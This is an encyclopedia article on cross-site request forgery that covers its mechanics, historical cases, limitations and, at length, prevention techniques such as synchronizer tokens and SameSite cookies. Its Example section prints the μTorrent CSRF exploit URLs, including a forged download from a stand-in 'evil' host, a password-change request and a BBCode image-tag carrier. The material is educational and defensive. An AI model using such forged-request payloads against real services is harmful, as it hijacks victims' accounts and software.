---
title: "Cross-site request forgery"
source: https://en.wikipedia.org/wiki/Cross-site_request_forgery
domain: cross-site-scripting-defense
license: CC-BY-SA-4.0
tags: cross-site scripting, xss attack vector, html output encoding, cross-site request forgery
fetched: 2026-07-02
---

# Cross-site request forgery

**Cross-site request forgery**, also known as **one-click attack** or **session riding** and abbreviated as **CSRF** (sometimes pronounced *sea-surf*) or **XSRF**, is a type of malicious exploit of a website or web application where unauthorized commands are submitted from a user that the web application trusts. There are many ways in which a malicious website can transmit such commands; specially-crafted image tags, hidden forms, and JavaScript fetch or XMLHttpRequests, for example, can all work without the user's interaction or even knowledge. Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser. In a CSRF attack, an innocent end user is tricked by an attacker into submitting a web request that they did not intend. This may cause actions to be performed on the website that can include inadvertent client or server data leakage, change of session state, or manipulation of an end user's account.

The term "CSRF" is also used as an abbreviation in defences against CSRF attacks, such as techniques that use header data, form data, or cookies, to test for and prevent such attacks.

## Characteristics

In a CSRF attack, the attacker's goal is to cause an innocent victim to unknowingly submit a maliciously crafted web request to a website that the victim has privileged access to. This web request can be crafted to include URL parameters, cookies and other data that appear normal to the web server processing the request. At risk are web applications that perform actions based on input from trusted and authenticated users without requiring the user to authorize (e.g. via a popup confirmation) the specific action. A user who is authenticated by a cookie saved in the user's web browser could unknowingly send an HTTP request to a site that trusts the user and thereby cause an unwanted action.

A general property of web browsers is that they will automatically and invisibly include any cookies (including session cookies and others) used by a given domain in any web request sent to that domain. This property is exploited by CSRF attacks. In the event that a user is tricked into inadvertently submitting a request through their browser these automatically included cookies will cause the forged request to appear real to the web server and it will perform any appropriately requested actions including returning data, manipulating session state, or making changes to the victim's account.

In order for a CSRF attack to work, an attacker must identify a reproducible web request that executes a specific action such as changing an account password on the target page. Once such a request is identified, a link can be created that generates this malicious request and that link can be embedded on a page within the attacker's control. This link may be placed in such a way that it is not even necessary for the victim to click the link. For example, it may be embedded within an html image tag on an email sent to the victim which will automatically be loaded when the victim opens their email. Once the victim has clicked the link, their browser will automatically include any cookies used by that website and submit the request to the web server. The web server will not be able to identify the forgery because the request was made by a user that was logged in, and submitted all the requisite cookies.

Cross-site request forgery is an example of a confused deputy attack against a web browser because the web browser is tricked into submitting a forged request by a less privileged attacker.

CSRF commonly has the following characteristics:

- It involves sites that rely on a user's identity.
- It exploits the site's trust in that identity.
- It tricks the user's browser into sending HTTP requests to a target site where the user is already authenticated.
- It involves HTTP requests that have side effects.

## History

CSRF Token vulnerabilities have been known and in some cases exploited since 2001. Because it is carried out from the user's IP address, some website logs might not have evidence of CSRF. Exploits are under-reported, at least publicly, and as of 2007 there were few well-documented examples:

- The Netflix website in 2006 had numerous vulnerabilities to CSRF, which could have allowed an attacker to perform actions such as adding a DVD to the victim's rental queue, changing the shipping address on the account, or altering the victim's login credentials to fully compromise the account.
- The online banking web application of ING Direct was vulnerable to a CSRF attack that allowed illicit money transfers.
- Popular video website YouTube was also vulnerable to CSRF in 2008 and this allowed any attacker to perform nearly all actions of any user.
- McAfee Secure was also vulnerable to CSRF and it allowed attackers to change their company system. This is fixed in newer versions.

## Example

Attackers who can find a reproducible link that executes a specific action on the target page while the victim is logged in can embed such link on a page they control and trick the victim into opening it. The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in an HTML email body or attachment. A real CSRF vulnerability in μTorrent (CVE-2008-6586) exploited the fact that its web console accessible at localhost:8080 allowed critical actions to be executed using a simple GET request:

**Force a .torrent file download**

http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent

**Change μTorrent administrator password**

http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin

Attacks were launched by placing malicious, automatic-action HTML image elements on forums and email spam, so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable μTorrent version at the same time as opening these pages were susceptible to the attack.

CSRF attacks using image tags are often made from Internet forums, where users are allowed to post images but not JavaScript, for example using BBCode:

```mw
[img]http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent[/img]
```

When accessing the attack link to the local μTorrent application at localhost:8080, the browser would also always automatically send any existing cookies for that domain. This general property of web browsers enables CSRF attacks to exploit their targeted vulnerabilities and execute hostile actions as long as the user is logged into the target website (in this example, the local μTorrent web interface) at the time of the attack.

In the μTorrent example described above, the attack was facilitated by the fact that μTorrent's web interface used GET request for critical state-changing operations (change credentials, download a file etc.), which RFC 2616 explicitly discourages:

> In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. These methods ought to be considered "safe". This allows user agents to represent other methods, such as POST, PUT and DELETE, in a special way, so that the user is made aware of the fact that a possibly unsafe action is being requested.

Because of this assumption, many existing CSRF prevention mechanisms in web frameworks will **not** cover GET requests, but rather apply the protection only to HTTP methods that are intended to be state-changing.

## Forging login requests

An attacker may forge a request to log the victim into a target website using the attacker's credentials; this is known as *login CSRF*. Login CSRF makes various novel attacks possible; for instance, an attacker can later log into the site with their legitimate credentials and view private information like activity history that has been saved in the account. This attack has been demonstrated against Google and Yahoo.

## HTTP verbs and CSRF

Depending on the type, the HTTP request methods vary in their susceptibility to the CSRF attacks (due to the differences in their handling by the web browsers). Therefore, the protective measures against an attack depend on the method of the HTTP request.

- In HTTP GET the CSRF exploitation is trivial, using methods described above, such as a simple hyperlink containing manipulated parameters and automatically loaded by an IMG tag. By the HTTP specification however, GET should be used as a safe method, that is, not significantly changing user's state in the application. Applications using GET for such operations should switch to HTTP POST or use anti-CSRF protection.
- the HTTP POST vulnerability to CSRF depends on the usage scenario:
  - In simplest form of POST with data encoded as a query string (`field1=value1&field2=value2`) CSRF attack is easily implemented using a simple HTML form and anti-CSRF measures must be applied.
  - If data is sent in any other format (JSON, XML) a standard method is to issue a POST request using XMLHttpRequest with CSRF attacks prevented by Same-origin policy (SOP) and Cross-origin resource sharing (CORS); there is a technique to send arbitrary content from a simple HTML form using `ENCTYPE` attribute; such a fake request can be distinguished from legitimate ones by `text/plain` content type, but if this is not enforced on the server, CSRF can be executed
- other HTTP methods (PUT, DELETE etc.) can only be issued using XMLHttpRequest with Same-origin policy (SOP) and Cross-origin resource sharing (CORS) preventing CSRF; these measures however will not be active on websites that explicitly disable them using `Access-Control-Allow-Origin: *` header

## Other approaches to CSRF

Additionally, while typically described as a static type of attack, CSRF can also be dynamically constructed as part of a payload for a cross-site scripting attack, as demonstrated by the Samy worm, or constructed on the fly from session information leaked via offsite content and sent to a target as a malicious URL. CSRF tokens could also be sent to a client by an attacker due to session fixation or other vulnerabilities, or guessed via a brute-force attack, rendered on a malicious page that generates thousands of failed requests. The attack class of "Dynamic CSRF", or using a per-client payload for session-specific forgery, was described in 2009 by Nathan Hamiel and Shawn Moyer at the BlackHat Briefings, though the taxonomy has yet to gain wider adoption.

A new vector for composing dynamic CSRF attacks was presented by Oren Ofer at a local OWASP chapter meeting in January 2012 – "AJAX Hammer – Dynamic CSRF".

## Effects

Severity metrics have been issued for CSRF token vulnerabilities that result in remote code execution with root privileges as well as a vulnerability that can compromise a root certificate, which will completely undermine a public key infrastructure.

## Limitations

Several things have to happen for cross-site request forgery to succeed:

1. The attacker must target a site that lacks CSRF protection, such as a site that does not use unpredictable CSRF tokens, does not enforce SameSite cookies, or has bypassed the same-origin policy using cross-origin resource sharing.
2. The attacker must find a state-changing action at the target site, such as a form submission or a URL that does something (e.g., transfers money, or changes the victim's e-mail address or password). Actions that only retrieve data are not useful as CSRF targets, because the attacker does not receive the response.
3. The attacker must determine the right values for all the forms or URL inputs; if any of them are required to be secret authentication values or IDs that the attacker can't guess, the attack will fail.
4. The attacker must lure the victim to a web page with malicious code while the victim is logged into the target site. The victim has to be authenticated in a way that is automatically included in browser requests, such as a session cookie. This enables authentication to be included in the attacker's malicious requests.

The attack is blind: the attacker cannot see what the target website sends back to the victim in response to the forged requests, unless they exploit a cross-site scripting vulnerability or other bug at the target website. Similarly, the attacker can only target any links or submit any forms that come up after the initial forged request if those subsequent links or forms are similarly predictable. Multiple targets can be simulated by including multiple images on a page, or by using JavaScript to introduce a delay between clicks.

## Prevention

Most CSRF prevention techniques work by embedding additional authentication data into requests that allows the web application to detect requests from unauthorized locations.

### Synchronizer token pattern

Synchronizer token pattern (STP) is a technique where a token, a secret and unique value for each request, is embedded by the web application in all HTML forms and verified on the server side. The token may be generated by any method that ensures unpredictability and uniqueness (e.g. using a hash chain of random seed). This is called an anti-forgery token in ASP.NET. The attacker is thus unable to place a correct token in their requests to authenticate them.

Example of STP set by Django in a HTML form:

```mw
<input type="hidden" name="csrfmiddlewaretoken" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt" />
```

STP is the most compatible as it only relies on HTML, but introduces some complexity on the server side, due to the burden associated with checking validity of the token on each request. As the token is unique and unpredictable, it also enforces proper sequence of events (e.g. screen 1, then 2, then 3) which raises usability problem (e.g. user opens multiple tabs). It can be relaxed by using per session CSRF token instead of per request CSRF token.

Web applications that use JavaScript for the majority of their operations may use the following anti-CSRF technique:

- On an initial visit without an associated server session, the web application sets a cookie. The cookie typically contains a random token which may remain the same for up to the life of the web session

```
Set-Cookie: __Host-csrf_token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; Expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/; SameSite=Lax; Secure
```

- JavaScript operating on the client side reads its value and copies it into a custom HTTP header sent with each transactional request

```
X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql
```

- The server validates presence and integrity of the token

Security of this technique is based on the assumption that only JavaScript running on the client side of an HTTPS connection to the server that initially set the cookie will be able to read the cookie's value. JavaScript running from a rogue file or email should not be able to successfully read the cookie value to copy into the custom header. Even though the csrf-token **cookie** may be automatically sent with the rogue request, subject to the cookies SameSite policy, the server will still expect a valid X-Csrf-Token **header**.

The CSRF token itself should be unique and unpredictable. It may be generated randomly, or it may be derived from the session token using HMAC:

```
csrf_token = HMAC(session_token, application_secret)
```

The CSRF token cookie must not have httpOnly flag, as it is intended to be read by JavaScript by design.

This technique is implemented by many modern frameworks, such as Django and AngularJS. Because the token remains constant over the whole user session, it works well with AJAX applications, but does not enforce sequence of events in the web application.

The protection provided by this technique can be thwarted if the target website **disables** its same-origin policy using one of the following techniques:

- clientaccesspolicy.xml file granting unintended access to Silverlight controls
- crossdomain.xml file granting unintended access to Flash movies

Similarly to the cookie-to-header approach, but without involving JavaScript, a site can set a CSRF token as a cookie, and also insert it as a hidden field in each HTML form. When the form is submitted, the site can check that the cookie token matches the form token. The same-origin policy prevents an attacker from reading or setting cookies on the target domain, so they cannot put a valid token in their crafted form.

The advantage of this technique over the Synchronizer pattern is that the token does not need to be stored on the server. However, if the site in question has cookie setting functionality, this protection can be bypassed.

An additional "SameSite" attribute can be included when the server sets a cookie, instructing the browser on whether to attach the cookie to cross-site requests. If this attribute is set to "strict", then the cookie will only be sent on same-site requests, making CSRF ineffective. However, this requires the browser to recognise and correctly implement the attribute.

### Client-side safeguards

Browser extensions such as RequestPolicy (for Mozilla Firefox) or uMatrix (for both Firefox and Google Chrome/Chromium) can prevent CSRF by providing a default-deny policy for cross-site requests. However, this can significantly interfere with the normal operation of many websites. The CsFire extension (also for Firefox) can mitigate the impact of CSRF with less impact on normal browsing, by removing authentication information from cross-site requests.

The NoScript extension for Firefox mitigates CSRF threats by distinguishing trusted from untrusted sites, and removing authentication & payloads from POST requests sent by untrusted sites to trusted ones. The Application Boundary Enforcer module in NoScript also blocks requests sent from internet pages to local sites (e.g. localhost), preventing CSRF attacks on local services (such as uTorrent) or routers.

The Self Destructing Cookies extension for Firefox does not directly protect from CSRF, but can reduce the attack window, by deleting cookies as soon as they are no longer associated with an open tab.

### Other techniques

Various other techniques have been used or proposed for CSRF prevention historically:

- Verifying that the request's headers contain `X-Requested-With` (used by Ruby on Rails before v2.0 and Django before v1.2.5), or checking the HTTP `Referer` header and/or HTTP `Origin` header.
- Checking the HTTP `Referer` header to see if the request is coming from an authorized page is commonly used for embedded network devices because it does not increase memory requirements. However, a request that omits the `Referer` header must be treated as unauthorized because an attacker can suppress the `Referer` header by issuing requests from FTP or HTTPS URLs. This strict `Referer` validation may cause issues with browsers or proxies that omit the `Referer` header for privacy reasons. Also, old versions of Flash (before 9.0.18) allow malicious Flash to generate GET or POST requests with arbitrary HTTP request headers using CRLF Injection. Similar CRLF injection vulnerabilities in a client can be used to spoof the referrer of an HTTP request.
- POST request method was for a while perceived as immune to trivial CSRF attacks using parameters in URL (using GET method). However, both POST and any other HTTP method can be now easily executed using XMLHttpRequest. Filtering out unexpected GET requests still prevents some particular attacks, such as cross-site attacks using malicious image URLs or link addresses and cross-site information leakage through `<script>` elements (*JavaScript hijacking*); it also prevents (non-security-related) problems with aggressive web crawlers and link prefetching.

Cross-site scripting (XSS) vulnerabilities (even in other applications running on the same domain) allow attackers to bypass essentially all CSRF preventions.
